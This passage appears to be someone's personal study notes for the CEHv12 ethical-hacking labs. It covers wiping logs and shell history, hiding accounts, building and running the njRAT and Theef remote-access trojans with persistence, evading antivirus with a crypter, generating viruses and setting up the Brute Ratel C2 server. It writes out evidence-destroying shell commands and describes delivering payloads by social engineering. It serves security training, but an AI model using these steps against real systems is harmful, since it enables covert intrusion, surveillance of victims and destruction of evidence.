id="1a751899-df1a-4d40-abfb-4bafdb49c7f8" class="toggle"><li><details open=""><summary>Clear Linux Machine Logs using the Bash Shell</summary><ul id="c7826e6d-1b37-42fd-906d-8ea6dd02b17b" class="bulleted-list"><li style="list-style-type:disc">Disable Bash shell from saving history<ul id="257b84f2-2d81-40a8-ad1a-d5fb51100a4f" class="bulleted-list"><li style="list-style-type:circle"><code><strong>export HISTSIZE=0</strong></code></li></ul></li></ul><ul id="e61c4d10-a7d7-4110-b3ac-a2ec096a9f52" class="bulleted-list"><li style="list-style-type:disc">Clear bash history<ul id="d97a8d7f-6e63-48da-92d9-fd73fd9c0c66" class="bulleted-list"><li style="list-style-type:circle"><code>history -c</code></li></ul></li></ul><ul id="6816bb5c-ef96-468e-a146-b830153d69e7" class="bulleted-list"><li style="list-style-type:disc">Clear bash history only of current shell<ul id="7938a8ed-8009-4806-bd88-0569d08e5eb0" class="bulleted-list"><li style="list-style-type:circle"><code><strong>history -w</strong></code></li></ul></li></ul><ul id="071149ea-3dc7-46d9-869c-724842074d6b" class="bulleted-list"><li style="list-style-type:disc">Corrupt the history file to make it unreadable<ul id="985f1524-5418-4100-af19-b6d4ae55999f" class="bulleted-list"><li style="list-style-type:circle"><code><strong>shred ~/.bash_history</strong></code></li></ul></li></ul><ul id="8a1d6232-2e57-44be-905b-a51eacff75b1" class="bulleted-list"><li style="list-style-type:disc">All of the above in a single command<ul id="1ce9a7f0-fb4a-4fcc-8804-a163832efd03" class="bulleted-list"><li style="list-style-type:circle"><code><strong>shred ~/.bash_history &amp;&amp; cat /dev/null &gt; .bash_history &amp;&amp; history -c &amp;&amp; exit</strong></code><code>.</code></li></ul><ul id="c439f253-8019-448e-a9c8-4411a80ddf9b" class="bulleted-list"><li style="list-style-type:circle">This command first shreds the history file, then deletes it, and finally clears the evidence of using this command. After this command, you will exit from the terminal window.</li></ul></li></ul></details></li></ul><ul id="86780d35-030f-45f2-8d8c-7f81b9c19d17" class="toggle"><li><details open=""><summary>Hiding folders and users in Windows and Linux Machines</summary><p id="f31e8f3a-96f1-4f94-beab-c0461ed72a1e" class="">Artifacts are the objects in a computer system that hold important information about the activities that are performed by user. </p><p id="53b6103a-975a-49bf-b0b6-545e4356d586" class="">Every operating system hides its artifacts such as internal task execution and critical system files.</p><p id="b8fdc526-3c3a-470a-b7eb-76bf9dcab280" class="">
</p><ul id="d2e58ea8-37c6-4f5f-9d5f-ab5c3326e006" class="toggle"><li><details open=""><summary>Hiding files and users in Windows</summary><ul id="9c3b30e8-ba8a-4898-bf4a-732d88f7e7b2" class="bulleted-list"><li style="list-style-type:disc">Hide directories<ul id="9bdd8d1d-a7fd-4c55-8da1-a98f1ddfe033" class="bulleted-list"><li style="list-style-type:circle"><code>attrib +h +s +r &lt;dirname&gt;</code></li></ul></li></ul><ul id="6f850bf5-6cbc-408a-b568-d8db775164ca" class="bulleted-list"><li style="list-style-type:disc">Hide user accounts<ul id="724b758b-7874-437e-bc39-9f0fc8c408a1" class="bulleted-list"><li style="list-style-type:circle">When a user is deactivated, it wont show on logon or on switch user</li></ul><ul id="1b2bd315-4e40-4e33-95c7-3c528084196d" class="bulleted-list"><li style="list-style-type:circle"><code>net user Test /add</code></li></ul><ul id="877822b3-697b-4069-8d2b-aedb563719e0" class="bulleted-list"><li style="list-style-type:circle"><code>net user Test/active:yes</code></li></ul><ul id="e5b095b5-c9d8-4b03-b39c-d32e33babf77" class="bulleted-list"><li style="list-style-type:circle"><code>net user Test /active:no</code></li></ul></li></ul></details></li></ul><ul id="538db64a-39f1-4ffd-91be-74dd9ae2ed36" class="toggle"><li><details open=""><summary>Hiding files and users in Linux</summary><ul id="bb167fde-171a-4c1c-81d1-6acbc81769bf" class="bulleted-list"><li style="list-style-type:disc">Create files and directories with <code>.</code> in front so they are hidden<ul id="4084b85e-b2e0-45e0-806e-ebe1f19ab08e" class="bulleted-list"><li style="list-style-type:circle"><code>ls -al</code> shows them</li></ul></li></ul><ul id="dcabe124-89ff-4ac0-97e0-e2dc28f90fa8" class="bulleted-list"><li style="list-style-type:disc"></li></ul></details></li></ul></details></li></ul><ul id="800d9a55-58ce-4450-828d-8de5db18a12b" class="toggle"><li><details open=""><summary>Clear Windows Logs using CCleaner</summary><ul id="19ab172c-7ad3-4289-bbbd-2d8a3e2a10a6" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\CCleaner</strong></code></li></ul><ul id="1cbb9bbc-7e1b-4101-a6d0-4416a876eb6b" class="bulleted-list"><li style="list-style-type:disc">Run trial</li></ul><ul id="70909c18-0e8e-4df9-a7d5-4b6ddaead73c" class="bulleted-list"><li style="list-style-type:disc">General<ul id="dc950710-8bc9-4769-9693-a53964d1ee28" class="bulleted-list"><li style="list-style-type:circle">Click Health Check → Start</li></ul><ul id="9896293d-0f4d-419a-b220-6d9c23cc43df" class="bulleted-list"><li style="list-style-type:circle">Click Make it better</li></ul></li></ul><ul id="74f8d1c3-1dde-4b5c-a279-4dddfbf01f06" class="bulleted-list"><li style="list-style-type:disc">Custom cleanup<ul id="f19a9f70-81ae-4fe7-9e4b-d0f047a658a4" class="bulleted-list"><li style="list-style-type:circle">Click <code>Custom Clean</code></li></ul><ul id="a67f3604-73b8-4582-95d0-a43a60a35091" class="bulleted-list"><li style="list-style-type:circle">Select hat you want to clean</li></ul></li></ul><p id="662a1695-99f4-49b5-a20e-f7bc97c89b0c" class="">
</p></details></li></ul><ul id="d921be69-795d-4341-a76d-e715e7e1a48b" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="fcc9634a-3953-44a8-86c6-713debb696c0" class="bulleted-list"><li style="list-style-type:disc"><strong>DBAN</strong> (dban.org)</li></ul><ul id="fa601832-1c6e-46ba-b7cb-dd6855ca9d8c" class="bulleted-list"><li style="list-style-type:disc"><strong>Privacy Eraser</strong> (cybertronsoft.com)</li></ul><ul id="39f7685a-63dc-4a3d-adec-c261b37b98ee" class="bulleted-list"><li style="list-style-type:disc"><strong>Wipe</strong> (privacyroot.com)</li></ul><ul id="ae669b6f-5061-43d4-98b9-e059487e65fd" class="bulleted-list"><li style="list-style-type:disc"><strong>BleachBit</strong> (bleachbit.org) to clear logs on the target machine.<br/><br/><br/></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="927e949f-d4b0-4d5e-b4ef-e65f37330cdb" class="toggle"><li><details open=""><summary>Lab 6 - Malware Threats - RATs, Viruses, Malware Analysis</summary><p id="a319b2d8-ba07-42d6-998e-dae4395a9bb0" class="">The lab activities in this module provide first-hand experience with various techniques that attackers use to write and propagate malware. </p><p id="4b312695-14f5-4108-af46-ca74d30241ae" class="">You will also learn how to effectively select security controls to protect your information assets from malware threats.</p><p id="7e3e8afa-f6d7-430c-aa51-af2ffee97ffc" class="">
</p><ul id="2f027b9c-6d7b-4765-a980-e5d7f7595ba1" class="toggle"><li><details open=""><summary>RATs and Viruses</summary><ul id="6508e509-6d8a-423b-8a90-112c3a471623" class="toggle"><li><details open=""><summary>Gain Control using njRAT RAT Trojan</summary><p id="35e10225-7e83-4491-b00b-7d15a7f5349d" class="">njRAT is a RAT with powerful data-stealing capabilities.</p><p id="b6a91512-431f-40b4-82e9-54622e13cb41" class="">In addition to logging keystrokes, it is capable of accessing a victim’s camera, stealing credentials stored in browsers, uploading and downloading files, performing process and file manipulations, and viewing the victim’s desktop.</p><p id="1eacebde-05cf-4a28-9115-134be12a18de" class="">This RAT can be used to control Botnets (networks of computers), allowing the attacker to update, uninstall, disconnect, restart, and close the RAT, and rename its campaign ID. </p><p id="9338bde2-0324-430e-babd-a8686404408b" class="">The attacker can further create and configure the malware to spread through USB drives with the help of the Command and Control server software</p><p id="a93b2495-bcab-47c8-8228-c29802280eb3" class="">
</p><ul id="0c50a06a-8daf-4394-9901-208f40cd6f01" class="toggle"><li><details open=""><summary>Create the exploit</summary><ul id="1c0aacaf-52fd-4dd7-9d8f-81fcfa472484" class="bulleted-list"><li style="list-style-type:disc">Go to <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT</code> and double-click njRAT v0.7d.exe.</li></ul><ul id="419cadd6-13c0-4c91-a63e-167852d3f9d5" class="bulleted-list"><li style="list-style-type:disc">Specify the port to interact with victim and press <code>Start</code></li></ul><ul id="e23237ed-ea19-4443-a5ab-d9abcf68e2c4" class="bulleted-list"><li style="list-style-type:disc">Click on <code>Builder</code> on lower left to configure exploit details</li></ul><ul id="497cb58e-518b-433c-a91a-54d020806646" class="bulleted-list"><li style="list-style-type:disc">Set <code>Host</code>, enable <code>Registry StarUp</code><ul id="ab6106f0-3876-4019-9a57-0f1fefe0d7c2" class="bulleted-list"><li style="list-style-type:circle">This will make the exploit run on startup, gaining persistence</li></ul></li></ul><ul id="4fc9db80-7968-463a-8af6-41a5e0e64e6f" class="bulleted-list"><li style="list-style-type:disc">Click <code>Build</code></li></ul><ul id="05d717f1-09be-474d-b684-c4994581d0c6" class="bulleted-list"><li style="list-style-type:disc">Run it in the target machine using social engineering</li></ul></details></li></ul><ul id="4d123b91-40d7-43dc-8f51-855c5ab64bda" class="toggle"><li><details open=""><summary>Post-exploitation</summary><ul id="2243a87b-0bc4-40c6-9404-68bb773b4b31" class="bulleted-list"><li style="list-style-type:disc">Exploited machines will show up in the screen</li></ul><ul id="916eab5d-7abc-4c64-977b-6306bcbce03f" class="toggle"><li><details open=""><summary>Manager <code>Right Click → Manager</code></summary><ul id="66c246a5-a929-480d-868a-9e5554899632" class="bulleted-list"><li style="list-style-type:disc">Click <code>File Manager</code>  (default) to browse and manipulate files</li></ul><ul id="1271e305-9875-4bca-9429-6503023a9e0e" class="bulleted-list"><li style="list-style-type:disc">Click <code>Process Manager</code>  to browse and manipulate processes</li></ul><ul id="b19c6c02-162c-4b32-a35c-13c9e9f6b1d8" class="bulleted-list"><li style="list-style-type:disc">Click <code>Connections</code> to browse and kill connections</li></ul><ul id="0a53658e-06e1-4d35-b044-9d20092bc16f" class="bulleted-list"><li style="list-style-type:disc">Click <code>Registry</code> to browse and manipulate registry</li></ul><ul id="9e7929c5-9d71-419a-bcab-a0b5b0438e04" class="bulleted-list"><li style="list-style-type:disc">Click <code>Remote Shell</code> to execute shell commands</li></ul><ul id="78106e06-3967-49dd-96b5-b5ed494abb38" class="bulleted-list"><li style="list-style-type:disc">Click <code>Services</code> to browse and manipulate services</li></ul></details></li></ul><ul id="e1640290-6e3c-4836-a2e5-38966a253d63" class="toggle"><li><details open=""><summary>Remote Desktop <code>Right Click -&gt; Remote Desktop</code></summary><ul id="78c9ab37-eced-4c41-8a84-df40e5855ace" class="bulleted-list"><li style="list-style-type:disc">A remote desktop window will appear without the victim’s awareness</li></ul><ul id="290a2444-35d1-4704-9f0c-60be4d31d266" class="bulleted-list"><li style="list-style-type:disc">To gain access to mouse and keyboard<ul id="9ba056dc-4a1f-417c-9504-65c99788a868" class="bulleted-list"><li style="list-style-type:circle">Hover the mouse over the top middle of the window and click the down arrow</li></ul><ul id="3e72babe-9281-4b8f-99c2-a2281073262c" class="bulleted-list"><li style="list-style-type:circle">Then choose mouse and/or keyboard</li></ul></li></ul></details></li></ul><ul id="720b76b5-8cab-4cb7-955c-d783ca854859" class="toggle"><li><details open=""><summary>Remote Cam/Microphone <code>Right Click -&gt; Remote Cam/Microphone</code></summary><ul id="40af1696-08c9-40ce-9c50-6bcb1d824896" class="bulleted-list"><li style="list-style-type:disc">Nothing to comment on this</li></ul></details></li></ul><ul id="0178849c-b3ce-4493-973a-a4b112025248" class="toggle"><li><details open=""><summary>Keylogger <code>Right Click -&gt; Keylogger</code></summary><ul id="14d4c571-e30f-4bd8-9277-70120d6bcf3c" class="bulleted-list"><li style="list-style-type:disc">Shows keys that were keylogged</li></ul><ul id="21d1298b-00d5-4506-b182-da7c1060cfae" class="bulleted-list"><li style="list-style-type:disc">Can find and refresh</li></ul></details></li></ul><ul id="94f38269-3378-4d15-ae8f-5f5854ad147e" class="toggle"><li><details open=""><summary>Chat <code>Rigth Click -&gt; Open Chat</code></summary><ul id="7ca1aaa4-c69a-42dc-b0e2-ae5e7d8a895c" class="bulleted-list"><li style="list-style-type:disc">Can chat with victim</li></ul><ul id="ebfa9b67-c7ca-4046-a420-3d663966381b" class="bulleted-list"><li style="list-style-type:disc">Will reopen the chat after each message if they close</li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="4827f7d8-6301-4e2b-99cf-70b7d2be873c" class="toggle"><li><details open=""><summary>Create a Trojan Server using Theef RAT Trojan</summary><p id="6712b350-3b4c-4003-9fb4-7f805025acb8" class="">Theef allows remote attackers access to the system via port 9871. </p><p id="c9d87445-db4e-4c2d-8a5a-0dc2091eac4c" class="">It is a Windows-based application for both client and server. </p><p id="f7d9d984-66dc-405e-9164-c275b0f97261" class="">The Theef server is a virus that you install on a target computer, and the Theef client is what you then use to control the virus.</p><p id="543d4a35-3db9-456a-807a-adfa4db6fce1" class="">
</p><ul id="294ff78c-4d55-401e-87d2-7d1ca4669d31" class="toggle"><li><details open=""><summary>Exploit a victim</summary><ul id="537cbb11-5ec8-4f92-9f3c-67d71d001591" class="bulleted-list"><li style="list-style-type:disc">Go to <code>CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef</code> and double-click <code>Server210.exe</code> to run the Trojan on the victim machine.</li></ul><ul id="260ac641-c6a4-491d-be27-7c4085775d99" class="bulleted-list"><li style="list-style-type:disc">Go to <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef</code> and double-click <code>Client210.exe</code> to access the victim machine<ul id="ae11070f-a73b-473f-80d5-db62eeb13c96" class="bulleted-list"><li style="list-style-type:circle">Type the IP of the victim machine</li></ul><ul id="8917defd-4ae4-46a9-82b7-60328b54efbb" class="bulleted-list"><li style="list-style-type:circle">Click <code>Connect</code></li></ul></li></ul></details></li></ul><ul id="e9dcb933-d943-4fa1-82e6-c9220250ca06" class="toggle"><li><details open=""><summary>Post-exploitation</summary><ul id="a02d1854-b7ab-4fb9-9602-2fbd6bbb8d0d" class="bulleted-list"><li style="list-style-type:disc">Click <code>Computer Information</code><ul id="936222ad-0a3c-4abb-8f89-77580ac29f2f" class="bulleted-list"><li style="list-style-type:circle">Here you can see PC Details, OS Info and Network info</li></ul></li></ul><ul id="bd057ecf-df05-4967-a687-8aa2f414764b" class="bulleted-list"><li style="list-style-type:disc">Click <code>Spy</code><ul id="13e9f197-821b-457b-bec0-e43b556b4c11" class="bulleted-list"><li style="list-style-type:circle">Here you can Capture the screen, see processes, see task manager, services, keylogger, webcam, passwords, chat etc.</li></ul></li></ul><ul id="6f81d542-6950-465d-9208-f689d2c634ff" class="bulleted-list"><li style="list-style-type:disc">Lots of other functionality like regedit, uninstall, clipboard, file explorer etc</li></ul></details></li></ul></details></li></ul><ul id="4f71a8f5-0bb3-4b08-b31c-a5086a4d6731" class="toggle"><li><details open=""><summary>Hide a Trojan using SwayzCryptor and Make it Undetectable to AV</summary><ul id="13112f6b-e3a6-4af7-a05c-cd2e4f75e450" class="bulleted-list"><li style="list-style-type:disc">Go to <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Crypters\SwayzCryptor</code> and double-click SwayzCryptor.exe</li></ul><ul id="6642c26b-6e0e-471a-aeed-6c983eb11747" class="bulleted-list"><li style="list-style-type:disc">Click <code>Start up, Mutex, Disable UAC</code> </li></ul><ul id="177f0f7f-769c-40ba-b9d6-50fc58de04f7" class="bulleted-list"><li style="list-style-type:disc">Click <code>Encrypt</code></li></ul><p id="2757b2d2-857c-4cba-ae3d-b0ffe23f5a9e" class=""><strong>In a test, using this cryptor, it achieved from 64/74 to 46/74 AV detections in virustotal</strong></p></details></li></ul><ul id="df0614b5-440d-4130-b1f4-8863b2893ac4" class="toggle"><li><details open=""><summary>Create a Virus using the JPS Virus Maker Tool</summary><ul id="80c38b3b-4442-4be4-b6bc-b6967649e752" class="bulleted-list"><li style="list-style-type:disc">Go to <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Virus Maker\JPS Virus Maker</code> and double-click <code>jps.exe</code></li></ul><ul id="fc79df2a-f2fe-48fc-9852-685be8e90b81" class="bulleted-list"><li style="list-style-type:disc">Select what you want to disable. Multiple options:<ul id="0acb7b6f-1e70-48a0-90d6-240c30ead6a3" class="bulleted-list"><li style="list-style-type:circle">disable registry, task manager, notepad, windows, taskbar, destroy cliboard, lock screen, remobe bluetooth, control panel, auto startup</li></ul><ul id="193cc58c-271d-4427-b9e8-e35b11ea15a5" class="bulleted-list"><li style="list-style-type:circle">turn off firewall/defender</li></ul></li></ul><ul id="7339f719-513a-46a4-bb47-34ed222d5ae0" class="bulleted-list"><li style="list-style-type:disc">On the right middle side, there is an arrow, click it<ul id="896d18db-b15f-4196-a4a8-8de18bce7193" class="bulleted-list"><li style="list-style-type:circle">change windows password</li></ul><ul id="2a026dbf-44c9-40f6-b151-d0c5e8ca0094" class="bulleted-list"><li style="list-style-type:circle">close custom window</li></ul><ul id="0ff98733-1522-409a-a9fd-713b0eb54b58" class="bulleted-list"><li style="list-style-type:circle">disable custom service</li></ul><ul id="a423e825-23ad-407b-ade5-197b87611231" class="bulleted-list"><li style="list-style-type:circle">run custom command</li></ul><ul id="926765f5-ffcb-4ca2-9514-5a67085499eb" class="bulleted-list"><li style="list-style-type:circle">convert to worm and copy after x seconds</li></ul></li></ul><ul id="d5da1602-3713-4c55-91f7-1cd9f9a818f2" class="bulleted-list"><li style="list-style-type:disc">Click <code>Create Virus</code><ul id="a4efd2a8-6e56-44f5-93dc-b91b1c8ee982" class="bulleted-list"><li style="list-style-type:circle">It will be shown on the same directory<br/><br/><br/></li></ul></li></ul></details></li></ul><ul id="a5826129-ea01-4b4a-902a-98663e1978c9" class="toggle"><li><details open=""><summary>Brute Ratel</summary><ul id="96dba641-2f66-43a9-9ad5-5eab95ff22a0" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Write notes to know how to use it</span><div class="indented"></div></li></ul><ul id="59926c0c-8143-4ad1-973b-f61240c449ad" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Test it</span><div class="indented"></div></li></ul><ul id="e97b7cb4-b360-4d58-b6b2-2326ffd1fe33" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Check if AV detects it (but virustotal?)</span><div class="indented"></div></li></ul><p id="9f4a7411-e282-426a-9914-21d5c1d00d41" class="">
</p><ul id="fbace447-aad7-4b92-9b1d-ea999628f45d" class="toggle"><li><details open=""><summary>Info on folders</summary><ul id="53ca2b8a-ec33-4933-827b-b09589c7c447" class="bulleted-list"><li style="list-style-type:disc">In the <code>adaptiveC2</code> folder <ul id="ea4c2772-5a77-4cd7-97ff-6bc804c39396" class="bulleted-list"><li style="list-style-type:circle">There is the <code>slack-connector.c</code> </li></ul><ul id="fc710a00-d640-4975-a21b-6b02dc2108d6" class="bulleted-list"><li style="list-style-type:circle">It is a sample of external C2 channel</li></ul><ul id="5ba8d199-fa3e-40a4-8889-c363b9a99e3a" class="bulleted-list"><li style="list-style-type:circle">It is a dropper for the payload that connects to the C2 server</li></ul><ul id="e314f968-7d08-4cea-8d13-79dc85b8148f" class="bulleted-list"><li style="list-style-type:circle">We can build our own C2 channel using the <code><a href="http://adaptiveC2.py">adaptiveC2.py</a></code> file</li></ul></li></ul><ul id="a1c645b6-7281-486e-ae12-4b3513978299" class="bulleted-list"><li style="list-style-type:disc">In the <code>adhoc_scripts</code> folder<ul id="be5a84f1-70d0-4c28-a6cc-0f0103d76dac" class="bulleted-list"><li style="list-style-type:circle">There is the <code><a href="http://install.sh">install.sh</a></code> which can install any dependencies we require<ul id="e97cdcd8-d501-4238-9008-df6854f179b1" class="bulleted-list"><li style="list-style-type:square">Most of the time we have them all</li></ul></li></ul><ul id="3d8bc32d-4112-47c2-8958-cb42eadc7979" class="bulleted-list"><li style="list-style-type:circle">There is the <code>genssl.sh</code> to generate new self signed certificates</li></ul><ul id="1f3e08be-9e36-4322-b3c2-887964ee0606" class="bulleted-list"><li style="list-style-type:circle">The <code><a href="http://badgerNotifier.py">badgerNotifier.py</a></code> is a script that enables you to forward any notifications to slack, discord etc.</li></ul></li></ul><ul id="ede98100-fc12-4bf8-a46d-60c5e7aef727" class="bulleted-list"><li style="list-style-type:disc">In the <code>adhoc_scripts/shellcode_loader_samples</code><ul id="bde601fd-6bfd-4391-b1bf-b3d03d9c62f3" class="bulleted-list"><li style="list-style-type:circle">It gives you various shellcode examples you can use</li></ul><ul id="b77f5b93-4c22-405b-8882-d75dae12fcbf" class="bulleted-list"><li style="list-style-type:circle">They are just examples, we are not supposed to use them directly</li></ul></li></ul></details></li></ul><ul id="b6a2e302-d22f-4127-8ab4-cf5d516cfe2f" class="toggle"><li><details open=""><summary>Start the server</summary><p id="8321ff96-02c2-4aad-9534-07b71a76e1a4" class=""><code>./brute-ratel-linx64 -ratel -a admin -p password -sc cert.pem -sk key.pem -h 0:0:0:0:8443</code><div class="indented"><ul id="655b6ffd-3d40-4a21-84b7-0409a9f1a420" class="bulleted-list"><li style="list-style-type:disc"><code>-ratel</code> starts in server mode</li></ul><ul id="d4246e1a-cb72-43f3-972a-d4aa2d3ecf96" class="bulleted-list"><li style="list-style-type:disc"><code>-h</code> is where the GUI will connect back</li></ul><ul id="d2cac8db-01e6-4a50-8279-40f6153e52be" class="bulleted-list"><li style="list-style-type:disc">The rest are for authentication, you can use any username and any password</li></ul><ul id="3d04fa06-1d78-441e-9fc6-8a914776d493" class="bulleted-list"><li style="list-style-type:disc">The certificates are to be used by servers and C2 channels</li></ul></div></p><ul id="b8b33f74-981e-47ff-b334-6c15f46b85f1" class="bulleted-list"><li style="list-style-type:disc">Leave it running</li></ul><ul id="678be2cb-5d3a-42b5-9e46-cc32a9073f3d" class="bulleted-list"><li style="list-style-type:disc">When it runs, it returns a comm-encryption key<ul id="94451859-641e-4282-ad02-d988b4ca0858" class="bulleted-list"><li style="list-style-type:circle">This is used to encrypt the requests going back and forth</li></ul></li></ul></details></li></ul><ul id="4ff575cd-2ce8-4fc3-b7ab-31f12bd05ba0" class="toggle"><li><details open=""><summary>Load the interface</summary><ul id="97b51eea-e01f-4705-982f-d6d8194f1c1f" class="bulleted-list"><li style="list-style-type:disc">Run <code>./commander-runme</code></li></ul><ul id="a2533433-3336-40e2-af22-ae892bdd4454" class="bulleted-list"><li style="list-style-type:disc">Type credentials<ul id="bcb139a5-3b04-439b-9b6b-19a453a08cba" class="bulleted-list"><li style="list-style-type:circle">localhost:8443</li></ul><ul id="5396a262-5333-4e0c-a79f-22da030f749b" class="bulleted-list"><li style="list-style-type:circle">admin and password used for starting the server</li></ul></li></ul></details></li></ul><ul id="7eeca79b-369a-4153-bc13-a2a4433d0903" class="toggle"><li><details open=""><summary>Using the Graphical Interface</summary><ul id="faca166c-a115-4069-b247-244d57c87fe6" class="bulleted-list"><li style="list-style-type:disc">The default listener configuration can be seen when pressing the <code>Gear Icon</code> under Scratchpad<ul id="b75a5721-de56-42d4-ba57-c5a221995a04" class="bulleted-list"><li style="list-style-type:circle">Initially is mostly empty</li></ul></li></ul><ul id="824328f7-db43-411e-998f-61b5d7679809" class="bulleted-list"><li style="list-style-type:disc">Add a new listener<ul id="a7d434d1-d74a-4a52-9bde-98da9ca81788" class="bulleted-list"><li style="list-style-type:circle">Go to <code>C4 Profiler -&gt; Add HTTP Listener</code></li></ul><ul id="b63f566a-371e-497d-9bf6-ba44eb9a05e4" class="bulleted-list"><li style="list-style-type:circle">Options Explained<ul id="50608b2b-7692-4c4e-9686-5c7f10bfc121" class="bulleted-list"><li style="list-style-type:square"><code>Listener Bind Host</code> is the server IP</li></ul><ul id="0cf2dfce-71fc-4e63-b140-ad0d9adb2c3a" class="bulleted-list"><li style="list-style-type:square"><code>Rotational Hosts</code> can add multiple hosts that rotates</li></ul><ul id="d4265bce-f015-4d2f-a5c8-e445d506a3fd" class="bulleted-list"><li style="list-style-type:square"><code>Useragent</code> what the field writes</li></ul><ul id="147d8d78-fef8-4f4c-930c-e5eff4de4fed" class="bulleted-list"><li style="list-style-type:square"><code>Headers</code> can add different headers and content type (use application/json)</li></ul><ul id="75660759-93ca-41e2-bf98-c1893e1dd89a" class="bulleted-list"><li style="list-style-type:square"><code>Post Request</code>  How it would look like when sent to the server</li></ul><ul id="96c072a7-40d9-41e1-9e2b-d95df7dc4a0e" class="bulleted-list"><li style="list-style-type:square"><code>Post Rsponse</code> the response that the server will send</li></ul><ul id="96816dba-1108-43be-a21f-4322a047a7c5" class="bulleted-list"><li style="list-style-type:square"><code>Empty Response</code> what to send when there is no response</li></ul><ul id="2c0087d9-ef5b-4bd1-87a2-d01926eda249" class="bulleted-list"><li style="list-style-type:square"><code>URI</code> can use multiple supposed endpoints to connect to when doing http requests (eg. admin.php?test=abc)</li></ul><ul id="fbd1cca5-fe69-40cd-8a4c-b0503a3694ce" class="bulleted-list"><li style="list-style-type:square"><code>Sleep Mask</code> responsible for encrypting heap, stack, spoofing stack when going to sleep etc<ul id="862b34cb-9b57-42a4-bdca-bd61ec541fc9" class="bulleted-list"><li style="list-style-type:disc">Has three different options for three different mechanisms</li></ul></li></ul><ul id="0e78d548-056e-4a71-9f94-b0b494ca9600" class="bulleted-list"><li style="list-style-type:square"> <code>One Time/Common Auth</code>  </li></ul><ul id="b7a56c6d-60e0-4af1-b9b4-ca5b5f85e948" class="bulleted-list"><li style="list-style-type:square"><code>Create random auth keys</code> for phising attacks, it uses different keys to identify different connections so that you know for example 5 clients have been fished</li></ul></li></ul><ul id="aa73efad-b36e-42b8-8fbb-be5b24d4e2f3" class="bulleted-list"><li style="list-style-type:circle">Once created, we can observed that the configuration has changed</li></ul></li></ul></details></li></ul><p id="b8f85fb4-0a2b-4c43-bdc9-782a8a0f00e1" class="">
</p><p id="b9362a40-d250-4492-901f-640a6bfdefe7" class="">
</p></details></li></ul></details></li></ul><ul id="1801a987-326e-40ac-a333-04d2bca313f8" class="toggle"><li><details open=""><summary>Malware Analysis</summary><ul id="63adb9b4-6a75-478b-99fb-ec07b8d0734e" class="toggle"><li><details open=""><summary>Static Analysis</summary><ul id="15c56338-7098-4b7a-aae1-56ef35d38acc" class="toggle"><li><details open=""><summary>Using Hybrid Analysis</summary><p id="8c2fd4d3-a32a-4a0e-9ac9-a4d243f18db7" class="">Hybrid Analysis is a free service that analyzes suspicious files and URLs and facilitates the quick detection of unknown threats such as viruses, worms, Trojans, and other kinds of malware.</p><p id="a1ab2874-f3f9-4b3f-9271-0e7247fff95a" class="">
</p><ul id="38ba80bb-8169-4407-b73f-592fb4559c71" class="bulleted-list"><li style="list-style-type:disc">hybrid-analysis.com<ul id="cb66db96-39c8-4910-a897-d84a719ccc64" class="bulleted-list"><li style="list-style-type:circle">Lets you select an environment to run on</li></ul><ul id="23df94d5-8b06-4733-b118-311a1f930767" class="bulleted-list"><li style="list-style-type:circle">Loads it on various vendors and shows if malicious</li></ul><ul id="8b0a879d-b6ca-4c2b-9928-fc5489b81286" class="bulleted-list"><li style="list-style-type:circle">Vendors can show more details</li></ul></li></ul><ul id="8ab17fe9-9cce-4adf-8512-193eb9e6558e" class="bulleted-list"><li style="list-style-type:disc">Other Tools<ul id="5e86aef1-628d-40fb-b638-fd19c688fa1c" class="bulleted-list"><li style="list-style-type:circle"><strong>Valkyrie</strong> (valkyrie.comodo.com)</li></ul><ul id="4d2d371a-89c8-4586-9b0f-8847af7da181" class="bulleted-list"><li style="list-style-type:circle"><strong>Cuckoo Sandbox</strong> (cuckoosandbox.org)</li></ul><ul id="65af0834-27df-48f0-95da-7e0fe77d63e8" class="bulleted-list"><li style="list-style-type:circle"><strong>Jotti</strong> (virusscan.jotti.org)</li></ul><ul id="57cfa291-fb5c-4297-b262-78f71616845d" class="bulleted-list"><li style="list-style-type:circle"><strong>IObit Cloud</strong> (cloud.iobit.com) </li></ul></li></ul></details></li></ul><ul id="1f33c6ac-48e3-4148-80f5-775f0dd44739" class="toggle"><li><details open=""><summary>Using BinText to search strings</summary><p id="58091cfe-4030-463d-ba74-2228804a17b1" class="">It doesn’t show what to do with this, just an example of possibly finding URLS</p><ul id="36061638-0b41-4af0-a964-b7c190e3109a" class="bulleted-list"><li style="list-style-type:disc">Go to <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\String Searching Tools\BinText</code> and double-click <code>bintext.exe</code></li></ul><ul id="4078efbe-b61d-4ea3-8bb1-b93b38927fc6" class="bulleted-list"><li style="list-style-type:disc">Load a virus <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\Klez Virus Live!\face.exe</code></li></ul><ul id="59cfb000-2106-4020-a69f-bc8fe1c61aa2" class="bulleted-list"><li style="list-style-type:disc">ANSI strings are marked with a green “A,” Unicode strings (double byte ANSI) have a red “U,” and resource strings have a blue “R.”</li></ul><ul id="ec23d400-e1fb-4b40-af7b-905bb5308c34" class="bulleted-list"><li style="list-style-type:disc"><code>File pos</code> is the HEX position at which the text is located in the file.</li></ul><ul id="87fc15f6-70fb-4915-a4d3-2f1ff3a0e5d1" class="bulleted-list"><li style="list-style-type:disc"><code>Mem pos</code> if the file is a Win32 PE file (such as Win95 EXEs and DLLs), then this is the HEX address at which the text is referred to in the memory at runtime, as determined by its sections table</li></ul><ul id="0da79536-4d1d-44e1-9591-f21bbeb81895" class="bulleted-list"><li style="list-style-type:disc">Other Tools:<ul id="c357aac4-377d-4094-8298-23373d5fd606" class="bulleted-list"><li style="list-style-type:circle"><strong>FLOSS</strong> 